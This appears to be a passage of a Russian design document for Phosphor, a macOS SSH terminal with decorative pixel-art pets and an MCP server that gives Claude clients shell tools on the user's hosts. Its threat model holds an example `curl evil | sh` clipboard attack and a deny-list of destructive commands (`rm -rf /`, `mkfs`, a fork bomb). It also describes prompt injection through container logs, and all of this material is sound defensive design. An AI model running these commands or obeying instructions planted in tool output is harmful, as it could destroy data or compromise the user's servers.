Зверь выбирается прямо в углу — две маленькие иконки внизу слева; полный список паков остаётся в настройках. Выбор меняет не только спрайт, но и всю обстановку, потому что дом у них устроен по-разному.

**Сахарный поссум** (*Petaurus breviceps*) — сумчатое из Австралии, Новой Гвинеи и прилежащих островов Индонезии. Живёт в эвкалиптовых лесах, **ночное и древесное**: днём спит в дупле, выстланном листьями, а ночью перелетает между деревьями, расправляя патагий — перепонку от запястья до лодыжки. Ест древесную камедь, нектар эвкалипта и насекомых. Пола в его мире нет вообще.

| | Котёнок | Сахарный поссум |
|---|---|---|
| Дом | Картонная коробка | Дупло в стволе, выстланное листьями |
| Опоры | Пол, полка, коробка | Две-три ветки на разной высоте — пола нет |
| Движение | Ходит и запрыгивает | **Планирует** между ветками с расправленной перепонкой |
| Предметы | Мяч, клубок, заводная мышь | Цветок эвкалипта, натёк камеди на коре, ночной мотылёк |
| Сон | Свернувшись на лежанке | В дупле, обернувшись хвостом |
| Свет уголка | Ровный | Ночной, приглушённый — зверь ночной |

Планирование — самая выигрышная анимация из всего, что тут есть, и стоит она ровно столько же: `translate` плюс `scaleX` на расправление перепонки. Ходьба у поссума заменяется коротким прыжком и длинным полётом.

Обе обстановки — это те же ассет-паки из §14.7: формат манифеста не меняется, к нему добавляется поле `habitat` с набором опор и предметов.

### 14.3 Где и какого размера

**Правый нижний угол.** Вывод терминала прижат к левому краю, а команды короткие — правая половина внизу пустует чаще всего. Левый низ пробовали: там стоит приглашение и идёт набор, уголок налезал на текст. Любой из четырёх углов выбирается в настройках.

Размер настраивается примерно от 180×140 до 420×320 точек. Рамкой границы не рисуются — зона мягко растворяется маской-градиентом, чтобы не выглядеть врезанным окном.

Второй режим — **уголок как панель в сайдбаре**, под деревом контейнеров. Тогда котята не перекрывают вообще ничего.

### 14.4 Слой и клики

`SKView` с прозрачным фоном, размером с уголок, с попаданием точно по спрайту:

- Клик попал **в кота или предмет** — взаимодействие.
- Клик попал в пустоту уголка — проходит насквозь, выделение текста работает как обычно.

Никаких модификаторов: точное попадание по спрайту заменяет `⌥`, который был нужен, пока котята бегали по всему окну.

### 14.5 Правило, на котором держится вся функция

**Котята спят, пока ты работаешь.** Идёт ввод или сыплется вывод — сворачиваются и спят. Терминал простаивает секунд двадцать — просыпаются, потягиваются и идут играть. Нажал клавишу — разбежались по местам.

Одно решение закрывает три задачи: не отвлекает во время работы, снимает вопрос расхода батареи (спящая сцена не перерисовывается) и в точности повторяет поведение настоящих котов.

Бюджет: до 1% процессора в спячке, до 3% в игре, ровно ноль когда окно перекрыто или приложение неактивно. Тридцати кадров хватает — пиксель-арт от шестидесяти ничего не выигрывает.

### 14.6 Сцена и предметы

Внутри уголка своя маленькая геометрия: пол, одна полка на стене и коробка, на которую можно запрыгнуть. Переходы между уровнями — отдельная анимация прыжка. Больше уровней в такую площадь не влезет, да и не надо.

Предметы расставляются мышью **в пределах уголка** и там же запоминаются. Мяч отскакивает от границ зоны — в текст ничего не улетает.

| Предмет | Поведение |
|---|---|
| Мячик | Катится с трением, отскакивает от границ уголка. Щёлкнешь мышью — улетит, кот побежит следом |
| Клубок | Медленнее мяча, тянет за собой нитку — тонкую линию акцентным цветом текущей темы |
| Коробка | Кот залезает и сидит. Заодно служит вторым уровнем сцены. Предмет обязательный: без коробки это не коты |
| Лежанка | Место, куда котята уходят спать, когда ты начал печатать |
| Миска | Наполняется сама раз в несколько часов, котята приходят есть |
| Когтеточка | Стоит у стенки уголка, кот подходит и дерёт |
| Заводная мышь | Бегает сама в пределах зоны, за ней охотятся |
| Лазерная точка | Держишь `⌥⌘` — котята прижимаются к ближней к курсору стенке и следят за точкой, но наружу не выходят. Так даже смешнее |

### 14.7 Ассет-пак

Пак = атлас PNG + манифест. Это ставит котят в ту же систему, что и цветовые схемы: их можно рисовать, обменивать и ставить чужие. Не пасхалка, а часть той самой кастомизации, ради которой всё затевалось.

```json
{
  "name": "Рыжий",
  "frameSize": [32, 32],
  "anchor": "bottom-center",
  "animations": {
    "idle":   { "row": 0, "frames": 4, "fps": 4 },
    "walk":   { "row": 1, "frames": 8, "fps": 10 },
    "jump":   { "row": 2, "frames": 6, "fps": 14, "loop": "once" },
    "sit":    { "row": 3, "frames": 2, "fps": 2 },
    "sleep":  { "row": 4, "frames": 4, "fps": 2, "loop": "pingpong" },
    "pounce": { "row": 5, "frames": 6, "fps": 12, "loop": "once" },
    "scratch":{ "row": 6, "frames": 6, "fps": 8 }
  },
  "traits": { "laziness": 0.6, "curiosity": 0.9, "speed": 1.0 }
}
```

Три числа в `traits` дают характер: ленивый кот спит вдвое дольше, любопытный первым бежит к новому предмету. Немного математики, а читается как личность.

### 14.8 Поведение и связь с работой

Крошечная машина состояний на кота, без ИИ и без физики сверх необходимой:

```
сон -> пробуждение -> блуждание -> интерес к предмету -> игра -> умывание -> сон
```

Переходы по весам со случайной примесью и поправкой на `traits`. Котята замечают друг друга: сталкиваются, гоняются, спят в куче на лежанке.

Реакции на работу — отдельным переключателем и аккуратно. Котята **не заменяют оповещения**: это украшение поверх настоящих индикаторов, а не вместо них.

- Команда, шедшая дольше минуты, завершилась — кот приносит заводную мышь к краю уголка.
- Контейнер упал — котята вздрагивают и на пару секунд разбегаются.
- Собрался билд — кот потягивается и мурлычет.

### 14.9 Выключатель

Обязателен и на виду: глобально, по окну и **по хосту**. На продовых хостах котят нет по умолчанию — по той же логике, по которой прод красный. На проде не играют.

## 15. MCP-сервер (`MCPBridge` + `Tools/phosphor-mcp`)

### 15.1 Топология

GUI-приложение держит соединения и состояние. MCP-клиенты (Claude Code, Claude Desktop) умеют запускать **процесс** и говорить по stdio. Поэтому:

```
Claude Code ──stdio──▶ phosphor-mcp (шим) ──unix socket──▶ Phosphor.app (реальные инструменты)
```

`phosphor-mcp` лежит внутри бандла (`Phosphor.app/Contents/MacOS/phosphor-mcp`), весит копейки и только проксирует JSON-RPC. Если приложение не запущено — шим отвечает внятной ошибкой и (опционально) поднимает его.

Регистрация у клиента:
```json
{ "mcpServers": { "phosphor": { "command": "/Applications/Phosphor.app/Contents/MacOS/phosphor-mcp" } } }
```

### 15.2 Инструменты

| Инструмент | Описание | Класс |
|---|---|---|
| `list_hosts` | Настроенные серверы и статус подключения | read |
| `host_metrics` | CPU по ядрам, RAM, диск, сеть, uptime | read |
| `run_command` | Выполнить команду на хосте | **write** |
| `list_containers` | Контейнеры хоста с состоянием и метриками | read |
| `container_logs` | Последние N строк логов, с фильтром | read |
| `container_inspect` | Полный `docker inspect` | read |
| `container_action` | start / stop / restart / rm | **write** |
| `list_authorized_keys` | Ключи на сервере | read |
| `manage_authorized_key` | Добавить / удалить ключ | **write** |

Реализация на `modelcontextprotocol/swift-sdk` — API подтверждён:

```swift
await server.withMethodHandler(ListTools.self) { _ in .init(tools: catalog) }
await server.withMethodHandler(CallTool.self) { params in
    guard let tool = catalog[params.name] else {
        return .init(content: [.text("Unknown tool")], isError: true)
    }
    try await policy.authorize(tool, params)     // может потребовать подтверждения в UI
    let result = try await tool.run(params)
    await audit.record(tool: params.name, args: params.arguments, result: result)
    return .init(content: [.text(result)], isError: false)
}
```

### 15.3 Безопасность — не опциональна

Терминал как MCP-сервер означает: **у модели появляется shell на твоих боевых серверах**. Это самая рискованная часть проекта, и защита должна быть спроектирована до первой строчки, а не прикручена потом.

1. **Режим на каждый хост:** `disabled` (по умолчанию для новых) / `read-only` / `confirm` / `full`. Прод по умолчанию — `read-only`.
2. **Подтверждение в UI:** в режиме `confirm` каждое пишущее действие поднимает диалог с точной командой и именем хоста. Ответ — не блокирующий вечно: таймаут → отказ.
3. **Списки команд:** deny-list с жёсткими шаблонами (`rm -rf /`, `mkfs`, `dd of=/dev/`, `shutdown`, `:(){ :|:& };:`) поверх любого режима, включая `full`.
4. **Аудит:** каждый вызов — в лог с меткой времени, хостом, инструментом, аргументами, результатом. Отдельная вкладка «Активность ИИ» в приложении, чтобы можно было посмотреть, что происходило.
5. **Rate limit** на write-инструменты.
6. **Секреты не уезжают:** приватные ключи и пароли не отдаются ни одним инструментом, никогда. `run_command` не подставляет секреты в команды.

## 16. Модель угроз

Что защищаем: доступ к твоим серверам и секреты, которыми он открывается. От кого: от **сервера, который тебе не принадлежит целиком** (взломанный, чужой, с чужим контейнером), от **процесса на твоём Маке**, от **человека у твоего Мака** и от **посредника в сети**. Разделы ниже — по поверхностям атаки, с решением на каждую.

### 16.1 Вывод сервера — это недоверенный ввод

Всё, что терминал рисует, диктует сервер: любая программа на нём, любой лог, который ты `cat`-нул, любое имя файла. Через escape-последовательности это превращается в атаки на **твою** машину:

- **OSC 52** — сервер пишет в буфер обмена. Следующая вставка в шелл `curl evil | sh` — и это уже выполнение кода на Маке.
- **Ответы терминала** (DECRQSS, answerback, запрос заголовка) — терминал отвечает серверу строкой, которую тот же сервер и подсунул; строка попадает в ввод как нажатия клавиш. Так ломали iTerm2 (CVE-2022-45872) и mintty.
- **OSC 8** — гиперссылка на `file://` или опасную схему под видом обычной.
- **DoS** — гигантские числовые параметры в CSI.

Решения, все — по умолчанию и без переключателя «отключить защиту»:

- Запись в буфер по OSC 52 — **только с подтверждением и показом содержимого**; чтение буфера сервером не поддерживается вовсе.
- Все ответы серверу (DA, DSR, DECRQSS, title report, ENQ) — выключены или фиксированная пустая строка. Ни один байт от сервера не может стать нашим вводом.
- OSC 8 — только `http` и `https`, реальный адрес по наведению, открытие по ⌘-клику.
- **Bracketed paste всегда включён.** Вставка нескольких строк или строки с управляющими символами — с подтверждением и показом того, что уйдёт.
- Параметры CSI ограничены сверху. Заголовок окна из последовательностей не используется для идентификации: имя хоста всегда из нашего профиля.
- Что из этого SwiftTerm делает сам, что надо отключить, а что дописать — проверка **S7** в неделе ноль.

### 16.2 SSH-транспорт

- Смена ключа хоста — **блок, не предупреждение**. `acceptAnything` только в тестах; релизная сборка проверяется на его отсутствие.
- **Terrapin (CVE-2023-48795)**: атака посредника работает при ChaCha20-Poly1305 или CBC с Encrypt-then-MAC; защита — strict kex с обеих сторон. Поэтому порядок шифров: **AES-GCM первым**, ChaCha20 — только если сервер больше ничего не умеет, и тогда пометка в карточке хоста. Поддержка strict kex в NIOSSH — проверить в S1.
- Проброс агента выключен по умолчанию: на скомпрометированном хосте им подписывают что угодно от твоего имени.
- Без DSA, без RSA-SHA1, без CBC.

### 16.3 Секреты

- Хранение — §7: Keychain `ThisDeviceOnly` с биометрией, профиль под ChaChaPoly, скроллбэк не на диске.
- В памяти секреты живут в `Data` и обнуляются после использования; не в `String` — строки копируются незаметно.
- `Logger` с `privacy: .private` для имён хостов и пользователей; секреты не логируются никогда — на `print` стоит правило линтера.
- Копирование секрета из приложения помечает запись в буфере как `org.nspasteboard.ConcealedType` (менеджеры буфера её не сохраняют) и очищает через 60 секунд.
- Переменные окружения контейнеров с `PASS`, `KEY`, `TOKEN`, `SECRET` в имени маскируются в интерфейсе и никогда не попадают в ответы MCP.

### 16.4 MCP

- **Инъекция через результаты инструментов.** Логи контейнера и вывод команд — недоверенный текст, который модель может принять за инструкции. Фильтровать текст бесполезно; защита в другом: **пишущее действие не выполняется без подтверждения в интерфейсе, что бы ни «сказал» лог.** Read-only по умолчанию, deny-list поверх всего, TTL разрешений, сухой прогон, аудит — §14.3.
- **Локальный сокет между шимом и приложением** — Unix-сокет в Application Support с правами 0600, проверка peer credentials (uid процесса) и одноразовый токен в рукопожатии. Иначе любой процесс на машине управляет твоими серверами через нас.
- Инструменты не возвращают секреты и полный env, обрезают вывод по размеру.
- MCP только по локальному сокету. Сетевой доступ к нему — намеренно вне рамок.

### 16.5 Рецепты и команды

- Домен, почта, имя хоста подставляются в команды только через экранирование (`shellQuote`), никакой интерполяции строк. Домен валидируется как FQDN, почта — как адрес.
- Показ команд перед запуском — не только удобство: пользователь видит ровно то, что уйдёт на сервер.
- Никаких `curl | sh`: пакеты ставятся из репозиториев с проверкой GPG-ключа.

### 16.6 SFTP и файлы

- Имена файлов от сервера недоверенные: `../`, абсолютные пути, символические ссылки. Локальная запись только внутри выбранной папки, имя санитизируется, по ссылкам не идём.
- Биты setuid и исполняемости не переносятся слепо; исполняемый файл — с предупреждением.

### 16.7 Обновления и цепочка поставок

- Sparkle: EdDSA, appcast только по HTTPS, `SUVerifyUpdateBeforeExtraction`, ключ в двух местах — §18.2.
- Зависимости — точной версией, `Package.resolved` в git, обновления только через PR от Dependabot с просмотром diff. Список короткий и закрытый: SwiftTerm, Citadel с NIO, NIOSOCKS, MCP SDK, Sparkle. Остальное — свой код.
- Hardened runtime без опасных entitlements: ни unsigned memory, ни dyld env.

### 16.8 Чего мы не делаем — осознанно

- Не пишем свою криптографию: только CryptoKit и NIOSSH.
- Не храним в UserDefaults ничего, кроме настроек вида.
- **Никаких интеграций**: ни телеметрии, ни внешних сервисов. Единственный сетевой трафик приложения — SSH к твоим серверам и загрузка appcast.

## 18. Как снимаем риски

Риск, который просто записан в список, ничего не стоит. Поэтому у каждого пункта здесь есть решение и запасной ход, а там, где остаётся настоящая неизвестность — дешёвая проверка, которую можно провести до того, как на этом решении будет построена половина приложения.

### 18.1 Неделя ноль

Семь проверок перед Э0. Каждая — несколько десятков строк одноразового кода и один вечер. Вместе они снимают почти всю неопределённость проекта.

| # | Что проверяем | Критерий успеха | Если провалилось |
|---|---|---|---|
| S1 | Делегат аутентификации: `custom()` + подпись через `$SSH_AUTH_SOCK` | Логин на реальный хост ключом из агента | Пароль и файл ключа в v1, агент — через `SystemSSHTransport` |
| S2 | Цепочка SOCKS: `SOCKSClientHandler` → `connect(on:)` через порт V2Box | Логин на закрытый сервер | Только TUN-режим V2Box и прямое соединение |
| S3 | Рендер: `cat` лога на 50 МБ и `yes` в SwiftTerm | Интерфейс отзывчив, процессор в разумных пределах | Коалесцирование фидов, жёсткий предел скроллбэка, лигатуры гаснут на потоке |
| S4 | 2FA: хост с `keyboard-interactive` | Диалог с полями от сервера, вход по коду | Тот же делегат, что в S1 — отдельного запасного хода не нужно |
| S5 | Профиль docker на всех твоих серверах | Возможности определяются верно везде | Ручной префикс команды в карточке хоста |
| S7 | Аудит escape-последовательностей SwiftTerm: OSC 52, DECRQSS, answerback, title report, OSC 8 | Ни одна из них не может ни писать в буфер без спроса, ни отвечать серверу | Своя фильтрация потока перед эмулятором |
| S6 | Путь установки целиком: собрать пустое приложение, выложить архив, скачать по ссылке и открыть как обычный пользователь | Приложение запускается, а инструкция понятна человеку, который не открывал Терминал | Пересмотр способа раздачи до Э1, а не после Э10 |

Порядок важен: **S1 и S6 идут первыми.** Первая решает, остаётся ли Citadel основным транспортом. Вторая — как приложение вообще попадёт к людям, см. §18.2 ниже.

### 18.2 Раздача и обновления

Аккаунта Apple Developer нет, приложение раздаётся через GitHub Releases. Это работает, но нужно понимать, что именно увидит человек, и подготовиться.

На Apple Silicon любой бинарь обязан быть подписан хотя бы **ad-hoc** (`codesign -s -`), иначе он просто не запустится — Xcode делает это сам режимом «Sign to Run Locally». Так что приложение запустится. Проблема в другом: у скачанного из интернета файла macOS ставит атрибут `com.apple.quarantine`, и Gatekeeper блокирует первый запуск неподписанного Developer ID приложения — вплоть до формулировки «повреждено и не может быть открыто», которая пугает и звучит как поломка, хотя это просто карантин.

Что с этим делаем:

- **Инструкция в README и на странице релиза**, дословная: первый запуск — двойной клик, отказ, затем Системные настройки → Конфиденциальность и безопасность → «Всё равно открыть». Со скриншотом. Один раз на установку.
- **Альтернатива одной строкой** для тех, кому удобнее: `xattr -dr com.apple.quarantine /Applications/<Имя>.app`.
- **Homebrew tap** — самый приятный путь: `brew install --cask <имя>` ставит без ручного разархивирования, а карантин снимается флагом.
- **Сборка из исходников** вообще не карантинится — вариант для тех, кто умеет.
- **Проект держим готовым к нотаризации:** hardened runtime включён с Э0, entitlements прописаны. Тогда появление аккаунта за $99 — это смена сертификата и один шаг в CI, а не переделка.

Честная оценка: без нотаризации часть людей до приложения не дойдёт — испугается предупреждения и закроет. Для раздачи «своим» это нормально, для широкой публикации — нет.

### Релизы и автообновление

Релиз — это тег `vX.Y.Z`, и больше ничего руками. GitHub Actions по тегу: сборка в Release, ad-hoc подпись, архив через `ditto`, EdDSA-подпись обновления, генерация `appcast.xml` и дельт, публикация релиза с автоматическими заметками — теми самыми «What's Changed» и «New Contributors», которые GitHub собирает из слитых PR. `.github/release.yml` раскладывает PR по категориям, Dependabot держит зависимости свежими и метит свои PR, чтобы они попадали в раздел Dependencies. Конвейер лежит в `.github/workflows/release.yml`.

**Автообновление — Sparkle 2.** Приложение проверяет `appcast.xml` (лежит прямо в ассетах последнего релиза), скачивает архив, проверяет подпись и ставит обновление само. Настройка: `SUFeedURL` и `SUPublicEDKey` в Info.plist, приватный ключ EdDSA — в секретах репозитория и в одной резервной копии, больше нигде.

Два факта, из-за которых это решение важнее, чем кажется:

- **EdDSA заменяет нам нотаризацию как механизм доверия.** Без Developer ID мы не можем доказать Gatekeeper, кто автор, — но каждой уже установленной копии можем доказать, что обновление настоящее: подпись проверяется ключом, который есть только у нашего CI.
- **Обновления ставит приложение, а не браузер.** Карантин Gatekeeper вешается на скачанное браузером. Sparkle скачивает сам — значит, предупреждение «повреждено» человек увидит один раз при первой установке и никогда больше.

Дельта-обновления `generate_appcast` делает сам: между соседними версиями качается разница, а не весь архив.

Что должно быть в порядке, иначе развалится:

- `CFBundleVersion` растёт монотонно — Sparkle сравнивает по нему, а не по красивой версии. Берём номер прогона CI.
- Приватный ключ EdDSA потерян = ни одна установленная копия больше не обновится, а ротация без Developer ID невозможна. Отсюда резервная копия.
- Первый релиз со Sparkle должен выйти **до** того, как приложение разойдётся: у копии без Sparkle нет пути к обновлению вообще. До Э10 приложение не раздаём.


### 18.3 Что уже перестало быть риском

Сверка с документацией по ходу планирования сняла три пункта, которые изначально выглядели тяжёлыми:

- **Прыжок через бастион** — у Citadel есть `jump(to:)`.
- **Соединение через прокси** — `SSHClient.connect(on:settings:)` принимает готовый NIO-канал, а `SOCKSClientHandler` лежит в пакете Apple.
- **Кастомная подпись** — `SSHAuthenticationMethod.custom()` принимает делегата NIOSSH.

Последнее — самая ценная находка планирования. Одна точка расширения закрывает сразу три вещи: ssh-agent, ключи из Secure Enclave и `keyboard-interactive` для 2FA. Три отдельных риска схлопнулись в одну задачу «написать делегата аутентификации», и она же оказалась спайком S1.

### 18.4 Регистр

| Риск | Решение | Запасной ход |
|---|---|---|
| Остатки пробелов Citadel: `~/.ssh/config` и ключи с passphrase | Конфиг **импортируем разово**, а не читаем при каждом подключении: показываем таблицу «что распознал, что пропустил», дальше живём своим менеджером хостов. Ключи с passphrase в основном снимает агент — он держит уже расшифрованный ключ | Свой `bcrypt-pbkdf` и `aes256-ctr`: алгоритм известный, объём небольшой. Либо `SystemSSHTransport` для проблемных хостов |
| Рендер захлёбывается на водопаде вывода | Байты копятся 16 мс и уходят в эмулятор пачкой; перерисовка не чаще частоты дисплея; скроллбэк ограничен; лигатуры гаснут на быстром выводе | Уменьшение буфера и отключение подсветки на потоке |
| Зоопарк docker-инсталляций | При подключении один раз считается **профиль возможностей** хоста — есть ли docker, нужен ли sudo, rootless ли он, не podman ли — и показывается в карточке. Дальше не гадаем | Ручной префикс команды в настройках хоста |
| V2Box не запущен | Проба порта и SOCKS-хендшейк до набора SSH; ошибка с кнопкой, которая открывает V2Box через `NSWorkspace` и ждёт появления порта | Встроенный `xray-core` в бандле — снимает зависимость целиком |
| Безопасность MCP | Режим по умолчанию «выключено»; deny-list поверх любого режима; **сухой прогон** — инструмент возвращает, что он бы сделал, не делая этого; разрешение живёт по таймауту, а не навсегда; аудит пишется в журнал, на который **не существует пишущего инструмента** | Отключение MCP на хосте одним переключателем |
| Скачавший увидит предупреждение Gatekeeper | Аккаунта разработчика нет, поэтому: ad-hoc подпись, дословная инструкция на странице релиза, Homebrew tap как основной путь, hardened runtime включён с Э0 — см. §18.2 | Аккаунт Apple Developer за $99 в год: сертификат меняется, код нет |
| Потеря мастер-ключа = потеря профиля | Плата за `ThisDeviceOnly`. Экспорт профиля под парольной фразой — штатная функция, плюс одно ненавязчивое напоминание сделать его, когда хостов станет трое | Секреты намеренно никуда не дублируются автоматически: это осознанный размен удобства на приватность |
| Потерян приватный ключ EdDSA | Он в секретах CI и в одной резервной копии. Ротировать без Developer ID нельзя, поэтому ключ живёт столько же, сколько приложение | Новый ключ = новая «первая установка» для всех, с предупреждением Gatekeeper заново |
| Вывод сервера как оружие | Escape-последовательности — недоверенный ввод: OSC 52 с подтверждением, ответы серверу выключены, bracketed paste всегда, см. §16.1 | Своя фильтрация потока перед эмулятором, если SwiftTerm не даёт отключить нужное |
| Объём в десять этапов | Э1 самодостаточен. Порядок выбрасывания при нехватке времени определён заранее: встроенный xray → редактор рецептов (встроенный остаётся) → Secure Enclave → метрики контейнеров → реакции котят на события → импорт чужих тем | Остановиться на любом этапе: каждый оставляет работающий продукт |
| Котята мешают работе | Закрыт отведённым углом: спячка во время ввода, клики мимо спрайтов проходят насквозь, выключатель на виду, на проде котят нет | — |

## 19. Открытые вопросы

- Иконка приложения (имя решено: Phosphor).
- **В каком режиме работает V2Box** — локальный прокси или TUN, и какой порт он слушает? От этого зависит, нужен ли SOCKS-путь с первого дня или пока хватит прямого соединения.
- Выставлять ли SSH-агент наружу: тогда ключами из Secure Enclave смогут пользоваться `git` и обычный `ssh`, а не только само приложение.
- **Как забрать серверы из Termius**, чтобы не перезаполнять менеджер хостов руками. Направления непроверенные: экспорт из самого Termius, его локальная база, наличие CLI. Мешает то, что при синхронизированном аккаунте данные зашифрованы.
- Откуда взять спрайты котят: рисовать самим, заказать пиксель-артисту или стартовать на наследии oneko и параллельно открыть формат паков.
- Синхронизация между машинами: iCloud исключён осознанно (см. §8.6), значит вопрос в том, достаточно ли ручного экспорта или нужен обмен через свой git-репозиторий.
- Нужна ли поддержка Kubernetes рядом с Docker, или сознательно вне рамок.
